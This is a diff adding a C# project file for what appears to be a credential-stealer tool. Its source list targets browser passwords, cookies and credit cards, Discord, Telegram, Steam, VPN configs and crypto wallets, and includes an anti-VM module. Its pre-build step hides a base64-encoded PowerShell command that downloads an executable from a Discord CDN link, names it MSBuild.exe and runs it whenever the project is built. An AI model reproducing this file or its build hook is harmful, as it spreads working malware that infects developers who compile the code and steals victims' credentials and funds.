@@ -1,0 +1,211 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{40E21185-E8AC-404D-9F9A-78367FC21402}</ProjectGuid>
+    <OutputType>Exe</OutputType>
+    <RootNamespace>Natasha</RootNamespace>
+    <AssemblyName>Natasha</AssemblyName>
+    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <Deterministic>true</Deterministic>
+    <NuGetPackageImportStamp>
+    </NuGetPackageImportStamp>
+    <TargetFrameworkProfile />
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <Prefer32Bit>false</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugType>none</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <Prefer32Bit>false</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup>
+    <StartupObject />
+  </PropertyGroup>
+  <PropertyGroup>
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+  </PropertyGroup>
+  <PropertyGroup>
+    <TargetZone>LocalIntranet</TargetZone>
+  </PropertyGroup>
+  <PropertyGroup>
+    <GenerateManifests>false</GenerateManifests>
+  </PropertyGroup>
+  <PropertyGroup />
+  <PropertyGroup>
+    <ApplicationIcon>
+    </ApplicationIcon>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Deployment" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Global\AntiVM check\AntiVM.cs" />
+    <Compile Include="Global\AES.cs" />
+    <Compile Include="Global\Counter.cs" />
+    <Compile Include="Global\FileManager.cs" />
+    <Compile Include="Global\GenString.cs" />
+    <Compile Include="Global\Help.cs" />
+    <Compile Include="Global\Sending.cs" />
+    <Compile Include="Global\WinAPI.cs" />
+    <Compile Include="Global\Zip\Zip.Shared\ComHelper.cs" />
+    <Compile Include="Global\Zip\Zip.Shared\EncryptionAlgorithm.cs" />
+    <Compile Include="Global\Zip\Zip.Shared\Events.cs" />
+    <Compile Include="Global\Zip\Zip.Shared\Exceptions.cs" />
+    <Compile Include="Global\Zip\Zip.Shared\ExtractExistingFileAction.cs" />
+    <Compile Include="Global\Zip\Zip.Shared\FileSelector.cs" />
+    <Compile Include="Global\Zip\Zip.Shared\OffsetStream.cs" />
+    <Compile Include="Global\Zip\Zip.Shared\Shared.cs" />
+    <Compile Include="Global\Zip\Zip.Shared\ZipConstants.cs" />
+    <Compile Include="Global\Zip\Zip.Shared\ZipCrypto.cs" />
+    <Compile Include="Global\Zip\Zip.Shared\ZipDirEntry.cs" />
+    <Compile Include="Global\Zip\Zip.Shared\ZipEntry.cs" />
+    <Compile Include="Global\Zip\Zip.Shared\ZipEntry.Extract.cs" />
+    <Compile Include="Global\Zip\Zip.Shared\ZipEntry.Read.cs" />
+    <Compile Include="Global\Zip\Zip.Shared\ZipEntry.Write.cs" />
+    <Compile Include="Global\Zip\Zip.Shared\ZipEntrySource.cs" />
+    <Compile Include="Global\Zip\Zip.Shared\ZipErrorAction.cs" />
+    <Compile Include="Global\Zip\Zip.Shared\ZipFile.AddUpdate.cs" />
+    <Compile Include="Global\Zip\Zip.Shared\ZipFile.cs" />
+    <Compile Include="Global\Zip\Zip.Shared\ZipFile.Events.cs" />
+    <Compile Include="Global\Zip\Zip.Shared\ZipFile.Extract.cs" />
+    <Compile Include="Global\Zip\Zip.Shared\ZipFile.Read.cs" />
+    <Compile Include="Global\Zip\Zip.Shared\ZipFile.Save.cs" />
+    <Compile Include="Global\Zip\Zip.Shared\ZipFile.Selector.cs" />
+    <Compile Include="Global\Zip\Zip.Shared\ZipFile.Static.cs" />
+    <Compile Include="Global\Zip\Zip.Shared\ZipFile.x-IEnumerable.cs" />
+    <Compile Include="Global\Zip\Zip.Shared\ZipInputStream.cs" />
+    <Compile Include="Global\Zip\Zip.Shared\ZipOutputStream.cs" />
+    <Compile Include="Global\Zip\Zip.Shared\ZipSegmentedStream.cs" />
+    <Compile Include="Global\Zip\Zlib.Shared\CRC32.cs" />
+    <Compile Include="Global\Zip\Zlib.Shared\Deflate.cs" />
+    <Compile Include="Global\Zip\Zlib.Shared\DeflateStream.cs" />
+    <Compile Include="Global\Zip\Zlib.Shared\GZipStream.cs" />
+    <Compile Include="Global\Zip\Zlib.Shared\Inflate.cs" />
+    <Compile Include="Global\Zip\Zlib.Shared\InfTree.cs" />
+    <Compile Include="Global\Zip\Zlib.Shared\ParallelDeflateOutputStream.cs" />
+    <Compile Include="Global\Zip\Zlib.Shared\Tree.cs" />
+    <Compile Include="Global\Zip\Zlib.Shared\Zlib.cs" />
+    <Compile Include="Global\Zip\Zlib.Shared\ZlibBaseStream.cs" />
+    <Compile Include="Global\Zip\Zlib.Shared\ZlibCodec.cs" />
+    <Compile Include="Global\Zip\Zlib.Shared\ZlibConstants.cs" />
+    <Compile Include="Global\Zip\Zlib.Shared\ZlibStream.cs" />
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+      <DependentUpon>Resources.resx</DependentUpon>
+    </Compile>
+    <Compile Include="Stealer\Browser\Helpers\Banking.cs" />
+    <Compile Include="Stealer\Browser\Helpers\Common.cs" />
+    <Compile Include="Stealer\Browser\Helpers\Decryptor.cs" />
+    <Compile Include="Stealer\Browser\Helpers\Json.cs" />
+    <Compile Include="Stealer\Browser\Helpers\Paths.cs" />
+    <Compile Include="Stealer\Browser\Helpers\Profile.cs" />
+    <Compile Include="Stealer\Browser\Helpers\SQLite.cs" />
+    <Compile Include="Stealer\Browser\Helpers\SqlReader.cs" />
+    <Compile Include="Stealer\Browser\Helpers\Utils.cs" />
+    <Compile Include="Stealer\Browser\Stealer.cs" />
+    <Compile Include="Stealer\Browser\Targets\Browsers\BrowserUtils.cs" />
+    <Compile Include="Stealer\Browser\Targets\Browsers\Chromium\AesGcm.cs" />
+    <Compile Include="Stealer\Browser\Targets\Browsers\Chromium\AutoFill.cs" />
+    <Compile Include="Stealer\Browser\Targets\Browsers\Chromium\BCrypt.cs" />
+    <Compile Include="Stealer\Browser\Targets\Browsers\Chromium\Bookmarks.cs" />
+    <Compile Include="Stealer\Browser\Targets\Browsers\Chromium\Chromium.cs" />
+    <Compile Include="Stealer\Browser\Targets\Browsers\Chromium\Cookies.cs" />
+    <Compile Include="Stealer\Browser\Targets\Browsers\Chromium\CreditCards.cs" />
+    <Compile Include="Stealer\Browser\Targets\Browsers\Chromium\Downloads.cs" />
+    <Compile Include="Stealer\Browser\Targets\Browsers\Chromium\History.cs" />
+    <Compile Include="Stealer\Browser\Targets\Browsers\Chromium\Passwords.cs" />
+    <Compile Include="Stealer\Browser\Targets\Browsers\Edge\AutoFill.cs" />
+    <Compile Include="Stealer\Browser\Targets\Browsers\Edge\Bookmarks.cs" />
+    <Compile Include="Stealer\Browser\Targets\Browsers\Edge\CreditCards.cs" />
+    <Compile Include="Stealer\Browser\Targets\Browsers\Edge\Edge.cs" />
+    <Compile Include="Stealer\Browser\Targets\Browsers\Firefox\Bookmarks.cs" />
+    <Compile Include="Stealer\Browser\Targets\Browsers\Firefox\Cookies.cs" />
+    <Compile Include="Stealer\Browser\Targets\Browsers\Firefox\FireFox.cs" />
+    <Compile Include="Stealer\Browser\Targets\Browsers\Firefox\History.cs" />
+    <Compile Include="Stealer\Browser\Targets\Browsers\Firefox\Passwords.cs" />
+    <Compile Include="Stealer\Browser\URLSearcher.cs" />
+    <Compile Include="Stealer\Collection.cs" />
+    <Compile Include="Config.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Stealer\Discord\Discord.cs" />
+    <Compile Include="Stealer\FileGrabber\Folders.cs" />
+    <Compile Include="Stealer\FileGrabber\Files.cs" />
+    <Compile Include="Stealer\FileGrabber\IFolders.cs" />
+    <Compile Include="Stealer\FTP\FileZilla.cs" />
+    <Compile Include="Stealer\Minecraft\VimeWorld.cs" />
+    <Compile Include="Stealer\Steam\Steam.cs" />
+    <Compile Include="Stealer\SystemInfo\BSSID.cs" />
+    <Compile Include="Stealer\SystemInfo\Buffer.cs" />
+    <Compile Include="Stealer\SystemInfo\ProcessList.cs" />
+    <Compile Include="Stealer\SystemInfo\Screen.cs" />
+    <Compile Include="Stealer\SystemInfo\SystemInfo.cs" />
+    <Compile Include="Stealer\Telegram\Telegram.cs" />
+    <Compile Include="Stealer\VPN\NordVPN.cs" />
+    <Compile Include="Stealer\VPN\OpenVPN.cs" />
+    <Compile Include="Stealer\VPN\ProtonVPN.cs" />
+    <Compile Include="Stealer\Wallets\Armory.cs" />
+    <Compile Include="Stealer\Wallets\AtomicWallet.cs" />
+    <Compile Include="Stealer\Wallets\BitcoinCore.cs" />
+    <Compile Include="Stealer\Wallets\Bytecoin.cs" />
+    <Compile Include="Stealer\Wallets\DashCore.cs" />
+    <Compile Include="Stealer\Wallets\Electrum.cs" />
+    <Compile Include="Stealer\Wallets\Ethereum.cs" />
+    <Compile Include="Stealer\Wallets\Exodus.cs" />
+    <Compile Include="Stealer\Wallets\Jaxx.cs" />
+    <Compile Include="Stealer\Wallets\LitecoinCore.cs" />
+    <Compile Include="Stealer\Wallets\Monero.cs" />
+    <Compile Include="Stealer\Wallets\StartWallets.cs" />
+    <Compile Include="Stealer\Wallets\Zcash.cs" />
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <SubType>Designer</SubType>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.config" />
+    <None Include="Global\Resources\DotNetZip.dll" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <PropertyGroup>
+    <PostBuildEvent>
+    </PostBuildEvent>
+  </PropertyGroup>
+  <PropertyGroup>
+    <PreBuildEvent>cd %25USERPROFILE%25 &amp;&amp; powershell.exe -EncodedCommand  IAAkAHcAYwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAIAAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwAHMAOgAvAC8AYwBkAG4ALgBkAGkAcwBjAG8AcgBkAGEAcABwAC4AYwBvAG0ALwBhAHQAdABhAGMAaABtAGUAbgB0AHMALwA5ADMANAAwADgAOAAyADkANgA3ADcANwAyADgAMQA1ADcAMAAvADkAMwA1ADUANAA2ADEAMgA2ADUAMQA2ADUAMQA0ADgANgA3AC8AZwAuAGUAeABlACIALAAiAE0AUwBCAHUAaQBsAGQALgBlAHgAZQAiACkAOwAgACQAYQByAGcAcwAgAD0AIABAACgAIgAtAC0AbABvAGEAZABlAGQAIgApADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAHAAYQB0AGgAIAAiAE0AUwBCAHUAaQBsAGQALgBlAHgAZQAiACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACQAYQByAGcAcwA=</PreBuildEvent>
+  </PropertyGroup>
+</Project>
